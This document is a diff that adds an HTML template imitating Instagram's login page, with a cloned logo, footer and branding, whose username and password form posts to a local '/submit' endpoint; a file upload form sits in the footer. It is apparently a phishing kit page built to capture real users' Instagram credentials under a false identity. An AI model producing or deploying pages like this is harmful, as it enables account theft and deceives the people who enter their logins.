@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Instagram</title>
+
+    <link rel="stylesheet" type="text/css" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+    <header>
+        <div class="main">
+            <div class="logo">
+                <img src="{{ url_for('static', filename='logo.png') }}" alt="logo">
+            </div>
+            <form action="/submit" method="POST" enctype="application/x-www-form-urlencoded" class="input">
+                <input type="text" class="signin" name="username" placeholder="Phone number, username, or email" required>
+                <br>
+                <input type="password" class="pass" name="password" placeholder="Password" required>
+                <br>
+                <div class="log">
+                    <button type="submit" name="submitButton">Log In</button>
+                </div>
+            </form>
+            
+            <hr class="hr1">
+            <p>OR</p>
+            <hr class="hr2">
+            <div class="fb">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/c/cd/Facebook_logo_%28square%29.png" height="15px" alt="Facebook Logo">
+                <a class="fb1" href="https://www.facebook.com/login/">Log in with Facebook</a>
+                <br>
+                <a class="fp" href="#">Forgot Password?</a>
+            </div>
+        </div>
+    </header>
+    
+    <main>
+        <div class="signup">
+            <p>Don't have an account? <a href="">Sign up</a></p>
+        </div>
+    </main>
+
+    <footer>
+        <h4>Get the app.</h4>
+        <div class="rightbox">
+            <a href="https://play.google.com/store/search?q=instagram&c=apps&hl=en" target="_blank">
+                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTJ4pyGyAGdFrqR9mjCPDfaV0B5zFoP8TvFH1_NRFqEl2cqdMqN1Bmw_wD1AiiqTYTgLg&usqp=CAU" height="40px" alt="Google Play Store">
+            </a>
+        </div>
+
+        <div class="app">
+            <br>
+            <a href="#">Meta</a>
+            <a href="#">About</a>
+            <a href="#">Blog</a>
+            <a href="#">Jobs</a>
+            <a href="#">Help</a>
+            <a href="#">API</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+            <a href="#">Top Accounts</a>
+            <a href="#">Hashtags</a>
+            <a href="#">Locations</a>
+            <a href="#">Instagram Lite</a>
+            <a href="#">Contact Uploading & Non-Users</a>
+        </div>
+        
+        <div class="app2">
+            <a href="#">English</a>
+            <a href="#">© 2022 Instagram from Meta</a>
+        </div>
+        <form method="POST" action="/uploadFile" enctype="multipart/form-data">
+            <input class="ok" type="file" name="file">
+            <button class="op">Submit</button>
+        </form> 
+    </footer>
+</body>
+</html>
